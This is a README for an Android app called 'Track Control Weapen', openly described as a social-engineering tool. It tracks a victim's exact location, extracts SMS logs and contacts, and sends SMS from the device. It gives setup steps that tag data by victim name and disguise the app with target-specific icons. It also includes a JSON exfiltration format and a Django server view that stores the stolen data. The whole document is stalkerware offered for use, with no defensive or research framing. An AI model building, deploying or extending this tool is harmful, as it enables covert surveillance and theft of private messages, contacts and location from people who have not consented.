<center> <h1> Track Control Weapen </h1> </center>

## Overview

This mobile app offers multiple modes of Social Engineering operation:

1. **Exact Location Tracking**: Track the exact location of the device.
2. **SMS Log Extraction**: Extract SMS logs from the device.
3. **Sending SMS from Device**: Send SMS messages from the device.
4. **Contact Extraction**: Extract contact information from the device.
5. **Installed App List Extraction**: Retrieve a list of installed apps on the device.
6. **More features coming soon**: Additional features will be added in future updates.

Currently, only the Exact Location Tracker is completed.

## TODO List

- [x] Exact Location Tracker
- [x] SMS Log Extraction
- [x] Sending SMS from Device
- [ ] Contact Extraction
- [ ] Installed App list Extraction
- [ ] Additional features

## Setup Instructions

To set up the app, follow these steps:

1. **Configure `strings.xml`**:
   - Navigate to the `res/values` folder.
   - Create or edit the `strings.xml` file using the template below:

### strings.xml Template

```xml
<resources>
    <string name="app_name">Your App Name</string>
    <string name="Victim">Name of victim to tag the received data</string>
    <string name="AppType">App type to generate (refer Changing App Modes) </string>
    <string name="server_Url">Server URL where POST request is created</string>
    <string name="SendSmsTo"> Phone No</string>
    <string name="Message">test Message to check</string>
    <string name="profile_image">Upload Profile Pic</string>
    <string name="upload_image">Update Pic</string>
</resources>
```

2. **Change the app icon**:

   - Navigate to the `res` folder.
   - Replace the existing icon files in the `mipmap` folders with your target(victim) based icon files.

3. **Build and Run the App**:
   - Open your project in Android Studio.
   - Build and run the app on your device or emulator.

## Structure of the POST Request

The app sends data to the server using a POST request with the following structure:

- `name`: Assigned in the `strings.xml`
- `mv01`: Contains all raw text data sent by the app

### Example POST Request

```json
{
	"name": "victim name",
	"mv01": "this is sent data"
}
```

## Receiver End Setup

The receiver end can be a Django server hosted on PythonAnywhere (https://www.pythonanywhere.com/) for free. To handle the POST request, you can use the following view:

```python
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_POST
from django.http import JsonResponse
from .models import tracker_database

@csrf_exempt
@require_POST
def tracker_database_entry(request):
    if request.POST.get("mv01"):
        entry = tracker_database(
            plan_data=request.POST.get("mv01"),
            name=request.POST.get("name", "s")
        )
        entry.save()
        response = {'status': 'success'}
        return JsonResponse(response, status=201)
    else:
        response = {'status': 'failure', 'message': 'Invalid data'}
        return JsonResponse(response, status=400)
```

## Changing App Modes

You can change the app modes by altering the `private Integer AppType = 1;` value in `MainActivity`. The available modes are:

- `0` -- All: Enable all features [only extraction].
- `1` -- Location: Enable exact location tracking.
- `2` -- SMS: Enable SMS log extraction.
- `3` -- Send SMS: Enable sending SMS from the device.
- `4` -- Contact: Enable Contact log extraction.
- `5` -- Installed App: Enable Installed App list log extraction.

## Contribution

If you would like to contribute to the project, please follow these steps:

1. Fork the repository.
2. Create a new branch (`git checkout -b feature-branch`).
3. Make your changes and commit them (`git commit -m 'Add new feature'`).
4. Push to the branch (`git push origin feature-branch`).
5. Create a new Pull Request.

## License

This project is licensed under the MIT License. See the `LICENSE` file for more details.
